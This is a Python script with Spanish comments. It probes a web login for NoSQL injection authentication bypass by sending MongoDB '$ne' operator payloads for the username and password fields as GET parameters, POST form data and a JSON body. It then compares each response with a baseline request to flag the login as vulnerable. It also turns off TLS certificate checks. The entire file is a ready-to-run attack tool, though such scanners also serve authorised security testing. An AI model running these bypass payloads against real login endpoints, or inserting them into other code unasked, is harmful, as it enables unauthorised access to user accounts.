import requests
import argparse
from time import sleep
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class AuthBypassTester:

    def __init__(self):
        self.args = self.parse_arguments()
        self.data = {}

    #Definimos y agregamos argumentos de la línea de comandos
    def parse_arguments(self):
        parser = argparse.ArgumentParser()
        parser.add_argument("-t", help="URL de destino")
        parser.add_argument("-u", help="Parámetro de nombre de usuario")
        parser.add_argument("-p", help="Parámetro de contraseña")
        parser.add_argument("-o", help="Otros parámetros, separados por coma")
        return parser.parse_args()

    #Enviamos una solicitud HTTP utilizando el método especificado (GET, POST,...) a la URL de destino proporcionada en los argumentos
    def make_request(self, method, data=None):
        global args
        request_method = getattr(requests, method)
        response = request_method(self.args.t, **data)
        return response.status_code, response.text, response.request.body if data else response.request.url

    #Realiza pruebas de bypass de autenticación mediante solicitudes HTTP
    def test_authentication(self, test_type):
        print(f"[*] Comprobando bypass de autenticación con solicitud {test_type.upper()}...")
        self.data.clear()

        if test_type == "GET":
            template_code, template_text, payload = self.template(1)
            bypass_code, bypass_text, payload = self.bypass(1)
        elif test_type == "POST":
            template_code, template_text, payload = self.template(2)
            bypass_code, bypass_text, payload = self.bypass(2)
        elif test_type == "POST_JSON":
            template_code, template_text, payload = self.template(3)
            bypass_code, bypass_text, payload = self.bypass(3)
        else:
            print("[!] Tipo de prueba no válido. Debe ser GET, POST o POST_JSON.")
            return

        #Mensajes que indican si una prueba de autenticación revela una vulnerabilidad
        if template_code != bypass_code:
            print(f"[+] El login probablemente es VULNERABLE al bypass de autenticación en solicitud {test_type}!")
            print(f"[!] Código de estado: {template_code} --> {bypass_code}\n[!] PAYLOAD: {payload}\n")
        elif template_text != bypass_text:
            print(f"[+] El login probablemente es VULNERABLE al bypass de autenticación en solicitud {test_type}!")
            print(f"[!] PAYLOAD: {payload}\n")
        else:
            print(f"[-] El login probablemente NO es vulnerable al bypass de autenticación en solicitud {test_type}...\n")

    #Inyecta credenciales, realiza una solicitud HTTP utilizando el método específico según el tipo de prueba
    def template(self, test):
        self.inject_credentials()
        if test == 1:
            return self.make_request("get", {"params": self.data, "allow_redirects": False, "verify": False})
        elif test == 2:
            return self.make_request("post", {"data": self.data, "allow_redirects": False, "verify": False})
        else:
            return self.make_request("post", {"json": self.data, "allow_redirects": False, "verify": False})

    #Inyecta un payload de bypass, según el tipo de prueba (GET, POST o POST_JSON) y devuelve la respuesta de la solicitud 
    def bypass(self, test):
        self.inject_bypass_payload(test)
        if test == 1:
            return self.make_request("get", {"params": self.data, "allow_redirects": False, "verify": False})
        elif test == 2:
            return self.make_request("post", {"data": self.data, "allow_redirects": False, "verify": False})
        else:
            return self.make_request("post", {"json": self.data, "allow_redirects": False, "verify": False})

    #Añade credenciales dummy (usuario y contraseña) al diccionario data, si hay otros parámetros tambien se agrega
    def inject_credentials(self):
        self.data[self.args.u] = "dummyusername123"
        self.data[self.args.p] = "dummypassword123"
        if self.args.o:
            for element in self.args.o.split(','):
                key, value = element.split('=')
                self.data[key] = value

    #Añade un payload de bypass a las credenciales del diccionario data utilizando operadores de comparación específicos ("$ne") 
    #para realizar la inyección
    def inject_bypass_payload(self, test):
        if test != 3:
            self.data[self.args.u + "[$ne]"] = "dummyusername123"
            self.data[self.args.p + "[$ne]"] = "dummypassword123"
        else:
            self.data[self.args.u] = {"$ne": "dummyusername123"}
            self.data[self.args.p] = {"$ne": "dummypassword123"}
        if self.args.o:
            for element in self.args.o.split(','):
                key, value = element.split('=')
                self.data[key] = value

#Pruebas de autenticación utilizando los métodos GET, POST y POST_JSON con intervalos de espera de 2 segundos
if __name__ == "__main__":
    tester = AuthBypassTester()
    tester.test_authentication("GET")
    sleep(2)
    tester.test_authentication("POST")
    sleep(2)
    tester.test_authentication("POST_JSON")
